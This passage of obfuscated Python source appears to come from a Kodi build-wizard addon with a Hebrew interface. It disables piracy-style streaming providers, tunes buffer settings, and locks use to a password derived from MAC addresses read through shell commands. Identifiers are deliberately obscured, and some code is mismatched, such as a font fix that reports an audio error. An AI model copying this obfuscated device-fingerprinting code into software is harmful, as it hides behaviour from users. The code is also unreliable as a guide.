		OOOO0000OO000OOOO .setSetting ('provider.primewire','false')#line:1947
		OOOO0000OO000OOOO .setSetting ('provider.projectfreetv','false')#line:1948
		OOOO0000OO000OOOO .setSetting ('provider.proxer','false')#line:1949
		OOOO0000OO000OOOO .setSetting ('provider.pureanime','false')#line:1950
		OOOO0000OO000OOOO .setSetting ('provider.putlocker','false')#line:1951
		OOOO0000OO000OOOO .setSetting ('provider.putlockerfree','false')#line:1952
		OOOO0000OO000OOOO .setSetting ('provider.reddit','false')#line:1953
		OOOO0000OO000OOOO .setSetting ('provider.cartoonwire','false')#line:1954
		OOOO0000OO000OOOO .setSetting ('provider.seehd','false')#line:1955
		OOOO0000OO000OOOO .setSetting ('provider.segos','false')#line:1956
		OOOO0000OO000OOOO .setSetting ('provider.serienstream','false')#line:1957
		OOOO0000OO000OOOO .setSetting ('provider.series9','false')#line:1958
		OOOO0000OO000OOOO .setSetting ('provider.seriesever','false')#line:1959
		OOOO0000OO000OOOO .setSetting ('provider.seriesonline','false')#line:1960
		OOOO0000OO000OOOO .setSetting ('provider.seriespapaya','false')#line:1961
		OOOO0000OO000OOOO .setSetting ('provider.sezonlukdizi','false')#line:1962
		OOOO0000OO000OOOO .setSetting ('provider.solarmovie','false')#line:1963
		OOOO0000OO000OOOO .setSetting ('provider.solarmoviez','false')#line:1964
		OOOO0000OO000OOOO .setSetting ('provider.stream-to','false')#line:1965
		OOOO0000OO000OOOO .setSetting ('provider.streamdream','false')#line:1966
		OOOO0000OO000OOOO .setSetting ('provider.streamflix','false')#line:1967
		OOOO0000OO000OOOO .setSetting ('provider.streamit','false')#line:1968
		OOOO0000OO000OOOO .setSetting ('provider.swatchseries','false')#line:1969
		OOOO0000OO000OOOO .setSetting ('provider.szukajkatv','false')#line:1970
		OOOO0000OO000OOOO .setSetting ('provider.tainiesonline','false')#line:1971
		OOOO0000OO000OOOO .setSetting ('provider.tainiomania','false')#line:1972
		OOOO0000OO000OOOO .setSetting ('provider.tata','false')#line:1975
		OOOO0000OO000OOOO .setSetting ('provider.trt','false')#line:1976
		OOOO0000OO000OOOO .setSetting ('provider.tvbox','false')#line:1977
		OOOO0000OO000OOOO .setSetting ('provider.ultrahd','false')#line:1978
		OOOO0000OO000OOOO .setSetting ('provider.video4k','false')#line:1979
		OOOO0000OO000OOOO .setSetting ('provider.vidics','false')#line:1980
		OOOO0000OO000OOOO .setSetting ('provider.view4u','false')#line:1981
		OOOO0000OO000OOOO .setSetting ('provider.watchseries','false')#line:1982
		OOOO0000OO000OOOO .setSetting ('provider.xrysoi','false')#line:1983
		OOOO0000OO000OOOO .setSetting ('provider.library','false')#line:1984
def fixfont ():#line:1987
	OOO0OO00OO00OOO00 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1988
	O00000O0O0O0O00OO =json .loads (OOO0OO00OO00OOO00 );#line:1990
	O00OOO0O0O0000000 =O00000O0O0O0O00OO ["result"]["settings"]#line:1991
	OOOOO000O0OO00OO0 =[O0OO00O000OOOOO0O for O0OO00O000OOOOO0O in O00OOO0O0O0000000 if O0OO00O000OOOOO0O ["id"]=="audiooutput.audiodevice"][0 ]#line:1993
	O0OO00O00OOO00000 =OOOOO000O0OO00OO0 ["options"];#line:1994
	O000O00O0O0OO0000 =OOOOO000O0OO00OO0 ["value"];#line:1995
	OO0OOOO00OOO00O0O =[O00O00000O0OO0OOO for (O00O00000O0OO0OOO ,O0OO000OO000000OO )in enumerate (O0OO00O00OOO00000 )if O0OO000OO000000OO ["value"]==O000O00O0O0OO0000 ][0 ];#line:1997
	OOO0OOO00OO00O00O =(OO0OOOO00OOO00O0O +1 )%len (O0OO00O00OOO00000 )#line:1999
	OOO0O0O000O0OOO00 =O0OO00O00OOO00000 [OOO0OOO00OO00O00O ]["value"]#line:2001
	OO0O0O000O0OO00O0 =O0OO00O00OOO00000 [OOO0OOO00OO00O00O ]["label"]#line:2002
	O00000O0OO0OO00O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:2004
	try :#line:2006
		OOOO0OOOO000O0000 =json .loads (O00000O0OO0OO00O0 );#line:2007
		if OOOO0OOOO000O0000 ["result"]!=True :#line:2009
			raise Exception #line:2010
	except :#line:2011
		sys .stderr .write ("Error switching audio output device")#line:2012
		raise Exception #line:2013
def parseDOM2 (OO0OO0OO0OOOO0OOO ,name =u"",attrs ={},ret =False ):#line:2014
	if isinstance (OO0OO0OO0OOOO0OOO ,str ):#line:2017
		try :#line:2018
			OO0OO0OO0OOOO0OOO =[OO0OO0OO0OOOO0OOO .decode ("utf-8")]#line:2019
		except :#line:2020
			OO0OO0OO0OOOO0OOO =[OO0OO0OO0OOOO0OOO ]#line:2021
	elif isinstance (OO0OO0OO0OOOO0OOO ,unicode ):#line:2022
		OO0OO0OO0OOOO0OOO =[OO0OO0OO0OOOO0OOO ]#line:2023
	elif not isinstance (OO0OO0OO0OOOO0OOO ,list ):#line:2024
		return u""#line:2025
	if not name .strip ():#line:2027
		return u""#line:2028
	OOO0OO0OO000O0000 =[]#line:2030
	for O0OO0000000OO0O00 in OO0OO0OO0OOOO0OOO :#line:2031
		O00OO00O0O0000OO0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0OO0000000OO0O00 )#line:2032
		for OOOOO000OOOOO0OOO in O00OO00O0O0000OO0 :#line:2033
			O0OO0000000OO0O00 =O0OO0000000OO0O00 .replace (OOOOO000OOOOO0OOO ,OOOOO000OOOOO0OOO .replace ("\n"," "))#line:2034
		O0O00OO00OO0000OO =[]#line:2036
		for O0OO000O0OOO0000O in attrs :#line:2037
			OO0OOOOO0000OO000 =re .compile ('(<'+name +'[^>]*?(?:'+O0OO000O0OOO0000O +'=[\'"]'+attrs [O0OO000O0OOO0000O ]+'[\'"].*?>))',re .M |re .S ).findall (O0OO0000000OO0O00 )#line:2038
			if len (OO0OOOOO0000OO000 )==0 and attrs [O0OO000O0OOO0000O ].find (" ")==-1 :#line:2039
				OO0OOOOO0000OO000 =re .compile ('(<'+name +'[^>]*?(?:'+O0OO000O0OOO0000O +'='+attrs [O0OO000O0OOO0000O ]+'.*?>))',re .M |re .S ).findall (O0OO0000000OO0O00 )#line:2040
			if len (O0O00OO00OO0000OO )==0 :#line:2042
				O0O00OO00OO0000OO =OO0OOOOO0000OO000 #line:2043
				OO0OOOOO0000OO000 =[]#line:2044
			else :#line:2045
				OO0O00O0000O00000 =range (len (O0O00OO00OO0000OO ))#line:2046
				OO0O00O0000O00000 .reverse ()#line:2047
				for OOO00000OO0000O00 in OO0O00O0000O00000 :#line:2048
					if not O0O00OO00OO0000OO [OOO00000OO0000O00 ]in OO0OOOOO0000OO000 :#line:2049
						del (O0O00OO00OO0000OO [OOO00000OO0000O00 ])#line:2050
		if len (O0O00OO00OO0000OO )==0 and attrs =={}:#line:2052
			O0O00OO00OO0000OO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0OO0000000OO0O00 )#line:2053
			if len (O0O00OO00OO0000OO )==0 :#line:2054
				O0O00OO00OO0000OO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0OO0000000OO0O00 )#line:2055
		if isinstance (ret ,str ):#line:2057
			OO0OOOOO0000OO000 =[]#line:2058
			for OOOOO000OOOOO0OOO in O0O00OO00OO0000OO :#line:2059
				O0OO0OOOOOOO0O0O0 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOOOO000OOOOO0OOO )#line:2060
				if len (O0OO0OOOOOOO0O0O0 )==0 :#line:2061
					O0OO0OOOOOOO0O0O0 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOOOO000OOOOO0OOO )#line:2062
				for O0OOOO00000OOO0OO in O0OO0OOOOOOO0O0O0 :#line:2063
					OO000OOO0000O0000 =O0OOOO00000OOO0OO [0 ]#line:2064
					if OO000OOO0000O0000 in "'\"":#line:2065
						if O0OOOO00000OOO0OO .find ('='+OO000OOO0000O0000 ,O0OOOO00000OOO0OO .find (OO000OOO0000O0000 ,1 ))>-1 :#line:2066
							O0OOOO00000OOO0OO =O0OOOO00000OOO0OO [:O0OOOO00000OOO0OO .find ('='+OO000OOO0000O0000 ,O0OOOO00000OOO0OO .find (OO000OOO0000O0000 ,1 ))]#line:2067
						if O0OOOO00000OOO0OO .rfind (OO000OOO0000O0000 ,1 )>-1 :#line:2069
							O0OOOO00000OOO0OO =O0OOOO00000OOO0OO [1 :O0OOOO00000OOO0OO .rfind (OO000OOO0000O0000 )]#line:2070
					else :#line:2071
						if O0OOOO00000OOO0OO .find (" ")>0 :#line:2072
							O0OOOO00000OOO0OO =O0OOOO00000OOO0OO [:O0OOOO00000OOO0OO .find (" ")]#line:2073
						elif O0OOOO00000OOO0OO .find ("/")>0 :#line:2074
							O0OOOO00000OOO0OO =O0OOOO00000OOO0OO [:O0OOOO00000OOO0OO .find ("/")]#line:2075
						elif O0OOOO00000OOO0OO .find (">")>0 :#line:2076
							O0OOOO00000OOO0OO =O0OOOO00000OOO0OO [:O0OOOO00000OOO0OO .find (">")]#line:2077
					OO0OOOOO0000OO000 .append (O0OOOO00000OOO0OO .strip ())#line:2079
			O0O00OO00OO0000OO =OO0OOOOO0000OO000 #line:2080
		else :#line:2081
			OO0OOOOO0000OO000 =[]#line:2082
			for OOOOO000OOOOO0OOO in O0O00OO00OO0000OO :#line:2083
				OOO00O0OO0000OO00 =u"</"+name #line:2084
				OOO00O00OO0OOO0OO =O0OO0000000OO0O00 .find (OOOOO000OOOOO0OOO )#line:2086
				OOOO0O0O00O000000 =O0OO0000000OO0O00 .find (OOO00O0OO0000OO00 ,OOO00O00OO0OOO0OO )#line:2087
				O0O0OOOOO000O0OO0 =O0OO0000000OO0O00 .find ("<"+name ,OOO00O00OO0OOO0OO +1 )#line:2088
				while O0O0OOOOO000O0OO0 <OOOO0O0O00O000000 and O0O0OOOOO000O0OO0 !=-1 :#line:2090
					OO0000O00OOO00OOO =O0OO0000000OO0O00 .find (OOO00O0OO0000OO00 ,OOOO0O0O00O000000 +len (OOO00O0OO0000OO00 ))#line:2091
					if OO0000O00OOO00OOO !=-1 :#line:2092
						OOOO0O0O00O000000 =OO0000O00OOO00OOO #line:2093
					O0O0OOOOO000O0OO0 =O0OO0000000OO0O00 .find ("<"+name ,O0O0OOOOO000O0OO0 +1 )#line:2094
				if OOO00O00OO0OOO0OO ==-1 and OOOO0O0O00O000000 ==-1 :#line:2096
					O0000O0OOO0O00O00 =u""#line:2097
				elif OOO00O00OO0OOO0OO >-1 and OOOO0O0O00O000000 >-1 :#line:2098
					O0000O0OOO0O00O00 =O0OO0000000OO0O00 [OOO00O00OO0OOO0OO +len (OOOOO000OOOOO0OOO ):OOOO0O0O00O000000 ]#line:2099
				elif OOOO0O0O00O000000 >-1 :#line:2100
					O0000O0OOO0O00O00 =O0OO0000000OO0O00 [:OOOO0O0O00O000000 ]#line:2101
				elif OOO00O00OO0OOO0OO >-1 :#line:2102
					O0000O0OOO0O00O00 =O0OO0000000OO0O00 [OOO00O00OO0OOO0OO +len (OOOOO000OOOOO0OOO ):]#line:2103
				if ret :#line:2105
					OOO00O0OO0000OO00 =O0OO0000000OO0O00 [OOOO0O0O00O000000 :O0OO0000000OO0O00 .find (">",O0OO0000000OO0O00 .find (OOO00O0OO0000OO00 ))+1 ]#line:2106
					O0000O0OOO0O00O00 =OOOOO000OOOOO0OOO +O0000O0OOO0O00O00 +OOO00O0OO0000OO00 #line:2107
				O0OO0000000OO0O00 =O0OO0000000OO0O00 [O0OO0000000OO0O00 .find (O0000O0OOO0O00O00 ,O0OO0000000OO0O00 .find (OOOOO000OOOOO0OOO ))+len (O0000O0OOO0O00O00 ):]#line:2109
				OO0OOOOO0000OO000 .append (O0000O0OOO0O00O00 )#line:2110
			O0O00OO00OO0000OO =OO0OOOOO0000OO000 #line:2111
		OOO0OO0OO000O0000 +=O0O00OO00OO0000OO #line:2112
	return OOO0OO0OO000O0000 #line:2114
def addItem (O0OOO0O0O000OO0OO ,OOO00O000O0000OOO ,OOOOOOOO0O00O000O ,O00000OO0OOOO00O0 ,O0OOO0O00000OOOO0 ,description =None ):#line:2116
	if description ==None :description =''#line:2117
	description ='[COLOR white]'+description +'[/COLOR]'#line:2118
	O0000000000OO00OO =sys .argv [0 ]+"?url="+urllib .quote_plus (OOO00O000O0000OOO )+"&mode="+str (OOOOOOOO0O00O000O )+"&name="+urllib .quote_plus (O0OOO0O0O000OO0OO )+"&iconimage="+urllib .quote_plus (O00000OO0OOOO00O0 )+"&fanart="+urllib .quote_plus (O0OOO0O00000OOOO0 )#line:2119
	OOOO0OO000O0OOO0O =True #line:2120
	O0O0OOOO00OO0OOOO =xbmcgui .ListItem (O0OOO0O0O000OO0OO ,iconImage =O00000OO0OOOO00O0 ,thumbnailImage =O00000OO0OOOO00O0 )#line:2121
	O0O0OOOO00OO0OOOO .setInfo (type ="Video",infoLabels ={"Title":O0OOO0O0O000OO0OO ,"Plot":description })#line:2122
	O0O0OOOO00OO0OOOO .setProperty ("fanart_Image",O0OOO0O00000OOOO0 )#line:2123
	O0O0OOOO00OO0OOOO .setProperty ("icon_Image",O00000OO0OOOO00O0 )#line:2124
	OOOO0OO000O0OOO0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0000000000OO00OO ,listitem =O0O0OOOO00OO0OOOO ,isFolder =False )#line:2125
	return OOOO0OO000O0OOO0O #line:2126
def get_params ():#line:2128
		OO0OOO00OO000000O =[]#line:2129
		O0O00O00OOO0O000O =sys .argv [2 ]#line:2130
		if len (O0O00O00OOO0O000O )>=2 :#line:2131
				O0OOOOOO00OOO0OOO =sys .argv [2 ]#line:2132
				OOO000OOOOOO0O000 =O0OOOOOO00OOO0OOO .replace ('?','')#line:2133
				if (O0OOOOOO00OOO0OOO [len (O0OOOOOO00OOO0OOO )-1 ]=='/'):#line:2134
						O0OOOOOO00OOO0OOO =O0OOOOOO00OOO0OOO [0 :len (O0OOOOOO00OOO0OOO )-2 ]#line:2135
				OOOO0O0OO000OO00O =OOO000OOOOOO0O000 .split ('&')#line:2136
				OO0OOO00OO000000O ={}#line:2137
				for O000O00O0OO00O000 in range (len (OOOO0O0OO000OO00O )):#line:2138
						OO00000O00O0O0000 ={}#line:2139
						OO00000O00O0O0000 =OOOO0O0OO000OO00O [O000O00O0OO00O000 ].split ('=')#line:2140
						if (len (OO00000O00O0O0000 ))==2 :#line:2141
								OO0OOO00OO000000O [OO00000O00O0O0000 [0 ]]=OO00000O00O0O0000 [1 ]#line:2142
		return OO0OOO00OO000000O #line:2144
def decode (O00000O0OO000000O ,OOOOO0O0OOO0O000O ):#line:2149
    import base64 #line:2150
    O0OOOO000O0O00OO0 =[]#line:2151
    if (len (O00000O0OO000000O ))!=4 :#line:2153
     return 10 #line:2154
    OOOOO0O0OOO0O000O =base64 .urlsafe_b64decode (OOOOO0O0OOO0O000O )#line:2155
    for OOO00000OO0OO0OOO in range (len (OOOOO0O0OOO0O000O )):#line:2157
        OO00OOO0OO0O00000 =O00000O0OO000000O [OOO00000OO0OO0OOO %len (O00000O0OO000000O )]#line:2158
        O0O0O00000OO0OO0O =chr ((256 +ord (OOOOO0O0OOO0O000O [OOO00000OO0OO0OOO ])-ord (OO00OOO0OO0O00000 ))%256 )#line:2159
        O0OOOO000O0O00OO0 .append (O0O0O00000OO0OO0O )#line:2160
    return "".join (O0OOOO000O0O00OO0 )#line:2161
def tmdb_list (OOOO0OOOOOOO0OOO0 ):#line:2162
    O00OOO000O0O000OO =decode ("7643",OOOO0OOOOOOO0OOO0 )#line:2165
    return int (O00OOO000O0O000OO )#line:2168
def u_list (O00OO0O00OO0OO0O0 ):#line:2169
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:2171
        from math import sqrt #line:2172
        O00OO0OOO0O0O0OOO =tmdb_list (TMDB_NEW_API )#line:2173
        O0O0000OO0OOOO0O0 =str ((getHwAddr ('eth0'))*O00OO0OOO0O0O0OOO )#line:2175
        O0000OOO000OOO000 =int (O0O0000OO0OOOO0O0 [1 ]+O0O0000OO0OOOO0O0 [2 ]+O0O0000OO0OOOO0O0 [5 ]+O0O0000OO0OOOO0O0 [7 ])#line:2176
        OOO00000O0OO0OO00 =(ADDON .getSetting ("pass"))#line:2178
        OOO0OO0OO0O0O0O0O =(str (round (sqrt ((O0000OOO000OOO000 *500 )+30 )+30 ,4 ))[-4 :]).replace ('.','')#line:2183
        if '.'in OOO0OO0OO0O0O0O0O :#line:2185
         OOO0OO0OO0O0O0O0O =(str (round (sqrt ((O0000OOO000OOO000 *500 )+30 )+30 ,4 ))[-5 :]).replace ('.','')#line:2186
        if OOO00000O0OO0OO00 ==OOO0OO0OO0O0O0O0O :#line:2188
          O0O0OO0O0O0O000O0 =O00OO0O00OO0OO0O0 #line:2190
        else :#line:2192
           if STARTP2 ()and STARTP ()=='ok':#line:2193
             return O00OO0O00OO0OO0O0 #line:2196
           O0O0OO0O0O0O000O0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:2197
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:2198
           sys .exit ()#line:2199
        return O0O0OO0O0O0O000O0 #line:2200
    else :#line:2201
        STARTP ()#line:2202
def disply_hwr ():#line:2206
   try :#line:2207
    OOO0OO00OOOOOOOO0 =tmdb_list (TMDB_NEW_API )#line:2208
    OOO0OO00OO00OO0O0 =str ((getHwAddr ('eth0'))*OOO0OO00OOOOOOOO0 )#line:2209
    OO00OO0O0OOOO0000 =(OOO0OO00OO00OO0O0 [1 ]+OOO0OO00OO00OO0O0 [2 ]+OOO0OO00OO00OO0O0 [5 ]+OOO0OO00OO00OO0O0 [7 ])#line:2216
    O0O00OOO0O00O0O0O =(ADDON .getSetting ("action"))#line:2217
    wiz .setS ('action',str (OO00OO0O0OOOO0000 ))#line:2219
   except :pass #line:2220
def disply_hwr2 ():#line:2221
   try :#line:2222
    O0OO0O0OO0O00000O =tmdb_list (TMDB_NEW_API )#line:2223
    OOOO0O0O0O0O0O0O0 =str ((getHwAddr ('eth0'))*O0OO0O0OO0O00000O )#line:2225
    O00OO000000O0OO0O =(OOOO0O0O0O0O0O0O0 [1 ]+OOOO0O0O0O0O0O0O0 [2 ]+OOOO0O0O0O0O0O0O0 [5 ]+OOOO0O0O0O0O0O0O0 [7 ])#line:2234
    OO00OOO00OOOO00OO =(ADDON .getSetting ("action"))#line:2235
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O00OO000000O0OO0O )#line:2238
   except :pass #line:2239
def getHwAddr (O0O0OO0000OOO00O0 ):#line:2241
   import subprocess ,time #line:2242
   OO0OOOO0O0O0OOOO0 ='windows'#line:2243
   if xbmc .getCondVisibility ('system.platform.android'):#line:2244
       OO0OOOO0O0O0OOOO0 ='android'#line:2245
   if xbmc .getCondVisibility ('system.platform.android'):#line:2246
     OO0OO00OOOO00000O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:2247
     O0O00O000O0O00OO0 =re .compile ('link/ether (.+?) brd').findall (str (OO0OO00OOOO00000O ))#line:2249
     OO000000OOO000OOO =0 #line:2250
     for O000OOOO0O00O00O0 in O0O00O000O0O00OO0 :#line:2251
      if O0O00O000O0O00OO0 !='00:00:00:00:00:00':#line:2252
          OOOOOOOOOOO000000 =O000OOOO0O00O00O0 #line:2253
          OO000000OOO000OOO =OO000000OOO000OOO +int (OOOOOOOOOOO000000 .replace (':',''),16 )#line:2254
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:2256
       OO000OO0OOOOO00OO =0 #line:2257
       OO000000OOO000OOO =0 #line:2258
       O00O0OOO00000OO00 =[]#line:2259
       O000000OOOOOO0000 =os .popen ("getmac").read ()#line:2260
       O000000OOOOOO0000 =O000000OOOOOO0000 .split ("\n")#line:2261
       for OO0OOOOOOO0OOOOO0 in O000000OOOOOO0000 :#line:2263
            O00O00O00O0OOO00O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO0OOOOOOO0OOOOO0 ,re .I )#line:2264
            if O00O00O00O0OOO00O :#line:2265
                O0O00O000O0O00OO0 =O00O00O00O0OOO00O .group ().replace ('-',':')#line:2266
                O00O0OOO00000OO00 .append (O0O00O000O0O00OO0 )#line:2267
                OO000000OOO000OOO =OO000000OOO000OOO +int (O0O00O000O0O00OO0 .replace (':',''),16 )#line:2270
   else :#line:2272
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:2273
   try :#line:2290
    return OO000000OOO000OOO #line:2291
   except :pass #line:2292
def getpass ():#line:2293
	disply_hwr2 ()#line:2295
def setpass ():#line:2296
    OOO0O0OO0OOOOOO0O =xbmcgui .Dialog ()#line:2297
    OO00O0O00OOOOOOO0 =''#line:2298
    OOO0000O0OOOO0O0O =xbmc .Keyboard (OO00O0O00OOOOOOO0 ,'הכנס סיסמה')#line:2300
    OOO0000O0OOOO0O0O .doModal ()#line:2301
    if OOO0000O0OOOO0O0O .isConfirmed ():#line:2302
           OOO0000O0OOOO0O0O =OOO0000O0OOOO0O0O .getText ()#line:2303
    wiz .setS ('pass',str (OOO0000O0OOOO0O0O ))#line:2304
def setuname ():#line:2305
    OOO0O0OO0O00OO0OO =''#line:2306
    O0OOO00OOOO0O0OOO =xbmc .Keyboard (OOO0O0OO0O00OO0OO ,'הכנס שם משתמש')#line:2307
    O0OOO00OOOO0O0OOO .doModal ()#line:2308
    if O0OOO00OOOO0O0OOO .isConfirmed ():#line:2309
           OOO0O0OO0O00OO0OO =O0OOO00OOOO0O0OOO .getText ()#line:2310
           wiz .setS ('user',str (OOO0O0OO0O00OO0OO ))#line:2311
def powerkodi ():#line:2312
    os ._exit (1 )#line:2313
def buffer1 ():#line:2315
	OOOO0000OOO000O0O =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:2316
	OO00OOOOO0OO00OOO =xbmc .getInfoLabel ("System.Memory(total)")#line:2317
	O0OOOO000OO0OO0O0 =xbmc .getInfoLabel ("System.FreeMemory")#line:2318
	OO00OO0O000OO00OO =re .sub ('[^0-9]','',O0OOOO000OO0OO0O0 )#line:2319
	OO00OO0O000OO00OO =int (OO00OO0O000OO00OO )/3 #line:2320
	O00000O000O0O00OO =OO00OO0O000OO00OO *1024 *1024 #line:2321
	try :OO00O00O000OOOO0O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2322
	except :OO00O00O000OOOO0O =16 #line:2323
	OO0OO0O0O0OOO00OO =DIALOG .yesno ('FREE MEMORY: '+str (O0OOOO000OO0OO0O0 ),'Based on your free Memory your optimal buffersize is: '+str (OO00OO0O000OO00OO )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:2326
	if OO0OO0O0O0OOO00OO ==1 :#line:2327
		with open (OOOO0000OOO000O0O ,"w")as OO0OOOO000OOOOO0O :#line:2328
			if OO00O00O000OOOO0O >=17 :OOOOOOOO00OO0OO0O =xml_data_advSettings_New (str (O00000O000O0O00OO ))#line:2329
			else :OOOOOOOO00OO0OO0O =xml_data_advSettings_old (str (O00000O000O0O00OO ))#line:2330
			OO0OOOO000OOOOO0O .write (OOOOOOOO00OO0OO0O )#line:2332
			DIALOG .ok ('Buffer Size Set to: '+str (O00000O000O0O00OO ),'Please restart Kodi for settings to apply.','')#line:2333
	elif OO0OO0O0O0OOO00OO ==0 :#line:2335
		O00000O000O0O00OO =_O0OOO00000000O0OO (default =str (O00000O000O0O00OO ),heading ="INPUT BUFFER SIZE")#line:2336
		with open (OOOO0000OOO000O0O ,"w")as OO0OOOO000OOOOO0O :#line:2337
			if OO00O00O000OOOO0O >=17 :OOOOOOOO00OO0OO0O =xml_data_advSettings_New (str (O00000O000O0O00OO ))#line:2338
			else :OOOOOOOO00OO0OO0O =xml_data_advSettings_old (str (O00000O000O0O00OO ))#line:2339
			OO0OOOO000OOOOO0O .write (OOOOOOOO00OO0OO0O )#line:2340
			DIALOG .ok ('Buffer Size Set to: '+str (O00000O000O0O00OO ),'Please restart Kodi for settings to apply.','')#line:2341
def xml_data_advSettings_old (O0O00OOOOO00OOO00 ):#line:2342
	O000OOOO0OOOOO0OO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O0O00OOOOO00OOO00 #line:2352
	return O000OOOO0OOOOO0OO #line:2353
def xml_data_advSettings_New (OO0OO0000O0OO0O00 ):#line:2355
	O0OOO0000O0O00000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OO0OO0000O0OO0O00 #line:2367
	return O0OOO0000O0O00000 #line:2368
def write_ADV_SETTINGS_XML (OO00000O0OOOO0OO0 ):#line:2369
    if not os .path .exists (xml_file ):#line:2370
        with open (xml_file ,"w")as O00O00O00000OOO0O :#line:2371
            O00O00O00000OOO0O .write (xml_data )#line:2372
def _O0OOO00000000O0OO (default ="",heading ="",hidden =False ):#line:2373
    ""#line:2374
    O000O0O0O0OO0OOOO =xbmc .Keyboard (default ,heading ,hidden )#line:2375
    O000O0O0O0OO0OOOO .doModal ()#line:2376
    if (O000O0O0O0OO0OOOO .isConfirmed ()):#line:2377
        return unicode (O000O0O0O0OO0OOOO .getText (),"utf-8")#line:2378
    return default #line:2379
def index ():#line:2381
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2382
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2383
	if AUTOUPDATE =='Yes':#line:2384
		if wiz .workingURL (WIZARDFILE )==True :#line:2385
			OOOO00O00O0OOOOO0 =wiz .checkWizard ('version')#line:2386
			if OOOO00O00O0OOOOO0 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OOOO00O00O0OOOOO0 ),'wizardupdate',themeit =THEME2 )#line:2387
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2388
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2389
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2390
	if len (BUILDNAME )>0 :#line:2391
		OOOO000O0O00OOOO0 =wiz .checkBuild (BUILDNAME ,'version')#line:2392
		OO000OOOOO0OO0OO0 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2393
		if OOOO000O0O00OOOO0 >BUILDVERSION :OO000OOOOO0OO0OO0 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OO000OOOOO0OO0OO0 ,OOOO000O0O00OOOO0 )#line:2394
		addDir (OO000OOOOO0OO0OO0 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2396
		try :#line:2398
		     O00OOOOOO0O0OO0OO =wiz .themeCount (BUILDNAME )#line:2399
		except :#line:2400
		   O00OOOOOO0O0OO0OO =False #line:2401
		if not O00OOOOOO0O0OO0OO ==False :#line:2402
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2403
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2404
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2407
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2408
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2409
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2413
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2415
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2417
def morsetup ():#line:2419
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2420
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2421
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2422
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2423
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2424
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2428
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2429
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2432
